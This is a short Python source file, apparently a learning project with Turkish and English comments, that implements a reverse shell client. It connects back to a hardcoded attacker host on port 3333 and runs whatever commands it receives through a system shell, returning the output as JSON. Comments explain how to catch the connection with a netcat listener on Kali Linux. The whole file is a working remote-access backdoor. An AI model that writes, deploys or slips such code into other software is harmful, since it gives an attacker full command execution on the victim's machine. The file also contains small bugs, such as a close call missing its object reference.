import socket
import subprocess
import json
import os

# target machine is kali linux and for controlling 
# type 'nc -l -p PORT_NUMBER' on terminal on kali linux 
# PORT_NUMBER is that we used 3333

# socket.socket(1,2)
# 1. hangi ag ailesi ile calisilacak.
# 2. hangi yol ile veriler transfer edilecek.

class MySocket:
	def __init__(self, ip, port):
		self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.my_connection.connect((ip, port))
		# my_connection.send("connected OK for windows\n")
	
	def command_execution(self, command) :
		# run command with shell
		return subprocess.check_output(command, shell=True)

	def json_send(self,data):
		json_data = json.dumps(data)
		self.my_connection.send(json_data)

	def json_receive(self):
		json_data = ""
		while True :
			try :
				json_data = json_data + self.my_connection.recv(1024)
				return json.loads(json_data)
			except ValueError :
				continue

	def execute_cd_comman(self,directory) :
		os.chdir(directory)
		return "Cd to " + directory

	def start_socket(self):
		while True:
			# will be received '1024 byte' data 
			command = self.json_receive()
			if command[0] == "quit" :
				my_connection.close()
				exit()													# exit python app
			elif command[0] == "cd" and len(command) > 1 :				# control cd file_name to change path
				command_output = self.execute_cd_comman(command[1])
			else :
				command_output = self.command_execution(command)
			self.json_send(command_output)
		
		self.my_connection.close()

my_socket_object = MySocket("10.0.2.4",3333)
my_socket_object.start_socket()